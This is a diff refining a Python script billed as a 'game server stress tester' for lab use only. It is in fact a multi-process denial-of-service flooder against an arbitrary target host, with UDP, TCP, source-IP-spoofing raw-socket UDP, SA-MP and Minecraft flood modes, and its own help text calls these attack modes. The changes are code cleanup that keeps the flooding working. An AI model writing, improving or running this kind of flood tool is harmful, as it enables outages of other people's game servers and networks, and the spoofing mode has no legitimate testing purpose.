@@ -3,6 +3,7 @@
 Universal Game Server Stress Tester v2 (Laboratory Use Only)
 Supports modes: udp, tcp, udp-spoof, samp, mc, combo
 """
+
 import argparse
 import asyncio
 import multiprocessing
@@ -11,6 +12,7 @@ import socket
 import struct
 import random
 import time
+import os
 import psutil
 
 # —— Helpers ——
@@ -28,7 +30,7 @@ def build_udp_packet(src: str, dst: str, dport: int, size: int) -> bytes:
     udp_hdr = struct.pack('!HHHH',
         random.randint(1024, 65535), dport, 8 + size, 0
     )
-    return ip_hdr + udp_hdr + random._urandom(size)
+    return ip_hdr + udp_hdr + os.urandom(size)
 
 
 def encode_varint(v: int) -> bytes:
@@ -64,7 +66,7 @@ async def tcp_flood_once(host: str, port: int, pkt_size: int, delay: float):
         reader, writer = await asyncio.wait_for(
             asyncio.open_connection(host, port), timeout=2
         )
-        writer.write(random._urandom(pkt_size))
+        writer.write(os.urandom(pkt_size))
         await writer.drain()
         writer.close()
         await writer.wait_closed()
@@ -74,24 +76,28 @@ async def tcp_flood_once(host: str, port: int, pkt_size: int, delay: float):
 
 async def udp_flood_once(host: str, port: int, pkt_size: int, delay: float):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    sock.sendto(random._urandom(pkt_size), (host, port))
+    sock.sendto(os.urandom(pkt_size), (host, port))
+    sock.close()
     await asyncio.sleep(delay)
 
 async def udp_spoof_once(host: str, port: int, pkt_size: int, delay: float):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
     except PermissionError:
+        print("[!] Permission denied: raw socket requires root privileges.")
         return
     pkt = build_udp_packet(random_ip(), host, port, pkt_size)
     sock.sendto(pkt, (host, port))
+    sock.close()
     await asyncio.sleep(delay)
 
-async def samp_once(host: str, port: int, _1: int, delay: float):
+async def samp_once(host: str, port: int, _pkt_size: int, delay: float):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.sendto(make_samp(host, port), (host, port))
+    sock.close()
     await asyncio.sleep(delay)
 
-async def mc_once(host: str, port: int, _1: int, delay: float):
+async def mc_once(host: str, port: int, _pkt_size: int, delay: float):
     try:
         reader, writer = await asyncio.wait_for(
             asyncio.open_connection(host, port), timeout=2
@@ -152,7 +158,7 @@ def run_process(args, mode: str, mode_func):
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Universal Stress Tester v2 (Lab Only)")
-    parser.add_argument("mode", choices=['udp','tcp','udp-spoof','samp','mc','combo'],
+    parser.add_argument("mode", choices=['udp', 'tcp', 'udp-spoof', 'samp', 'mc', 'combo'],
                         help="Attack mode")
     parser.add_argument("host", help="Target IP or hostname")
     parser.add_argument("-p", "--port", type=int, default=25565, help="Target port")
@@ -179,9 +185,8 @@ if __name__ == "__main__":
 
     modes = [args.mode] if args.mode != 'combo' else ['udp', 'tcp', 'samp', 'mc']
     procs = []
-    for m in modes:
-        mode = m
-        mode_func = funcs.get(m)
+    for mode in modes:
+        mode_func = funcs.get(mode)
         if not mode_func:
             continue
         print(f"[+] Mode: {mode} | Concurrency: {args.concurrency} | Processes: {args.processes}")
